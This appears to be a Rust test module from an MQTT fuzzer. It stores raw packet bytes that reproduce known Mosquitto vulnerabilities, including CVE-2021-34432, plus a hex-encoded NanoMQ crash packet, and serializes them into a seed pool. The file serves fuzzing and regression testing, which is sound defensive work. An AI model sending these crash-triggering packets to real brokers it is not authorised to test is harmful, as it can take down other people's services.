//! Here are packets from previously discovered CVEs

use crate::MAX_PACKETS;
/// https://www.cvedetails.com/cve/CVE-2021-34432/
#[allow(unused)]
const CVE_2021_34432: &[&[u8]; MAX_PACKETS] = &[
    &[
        16, 60, 0, 4, 77, 81, 84, 84, 4, 4, 0, 0, 0, 17, 72, 101, 108, 108, 111, 32, 77, 81, 84,
        84, 32, 66, 114, 111, 107, 101, 114, 0, 5, 116, 111, 112, 105, 99, 0, 22, 1, 2, 3, 4, 5, 6,
        7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 72, 255, 50, 0, 0, 0,
    ],
    &[48, 10, 0, 0, 116, 101, 115, 116, 116, 101, 115, 116],
    &[224],
    &[],
    &[],
    &[],
    &[],
    &[],
    &[],
    &[],
];
#[allow(unused)]
const OTHER_MOSQUITTO_CVE: &[&[u8]; MAX_PACKETS] = &[
    &[
        16, 96, 0, 4, 77, 81, 84, 84, 5, 192, 93, 85, 34, 21, 0, 15, 98, 99, 82, 85, 100, 109, 83,
        68, 89, 117, 119, 98, 86, 54, 50, 22, 0, 6, 72, 55, 70, 79, 120, 77, 23, 0, 25, 1, 34, 234,
        35, 0, 25, 118, 116, 78, 87, 72, 80, 101, 56, 48, 98, 52, 99, 86, 120, 102, 85, 107, 110,
        114, 116, 86, 89, 68, 122, 88, 0, 14, 86, 52, 86, 108, 79, 115, 54, 55, 73, 100, 84, 81,
        70, 68, 0, 6, 90, 48, 53, 99, 79, 57, 112, 4, 122, 230, 236, 0, 112, 24, 205, 229, 136, 20,
        38, 12, 49, 107, 51, 69, 111, 109, 83, 86, 119, 70, 114, 0, 3, 50, 75, 86, 64, 54, 206,
        187, 210, 50, 38, 0, 24, 57, 105, 111, 113, 118, 80, 115, 53, 68, 85, 111, 97, 56, 115, 79,
        43, 81, 54, 86, 103, 77, 49, 54, 112, 21, 100, 50, 84, 116, 114, 75, 66, 73, 116, 88, 103,
        106, 56, 97, 84, 84, 81, 89, 107, 81, 118,
    ],
    &[],
    &[],
    &[],
    &[],
    &[],
    &[],
    &[],
    &[],
    &[],
];
mod tests {
    use super::*;
    use crate::packets::{PacketQueue, Packets};
    use std::fs::write;

    #[test]
    fn nanomq_bug() {
        let packet = hex::decode("106000044d51545405c05d552215000f62635255646d5344597577625636321600064837464f784d1700190122ea23001976744e574850653830623463567866556b6e72745659447a58000e5634566c4f73363749645451464400065a3035634f3970047ae6ec007018cde58814260c316b33456f6d53567746720003324b564036cebbd23226001839696f717650733544556f6138734f2b513656674d3136701564325474724b42497458676a3861545451596b5176");
        let packet = packet.unwrap();
        println!("Packet: {:?}", packet);
    }
    #[test]
    fn serialize_packet_pool() {
        let mut packet_pool = PacketQueue::default();
        let packets = Packets {
            inner: CVE_2021_34432
                .iter()
                .map(|x| x.to_vec())
                .collect::<Vec<Vec<u8>>>()
                .try_into()
                .unwrap(),
        };
        packet_pool
            .inner
            .insert(CVE_2021_34432[1].to_vec(), packets);
        let packets = Packets {
            inner: OTHER_MOSQUITTO_CVE
                .iter()
                .map(|x| x.to_vec())
                .collect::<Vec<Vec<u8>>>()
                .try_into()
                .unwrap(),
        };
        packet_pool
            .inner
            .insert(OTHER_MOSQUITTO_CVE[0].to_vec(), packets);
        let serialized = toml::to_string(&packet_pool).unwrap();
        println!("Serialized: {}", serialized);
        write("packet_pool.toml", serialized).unwrap();
    }
}
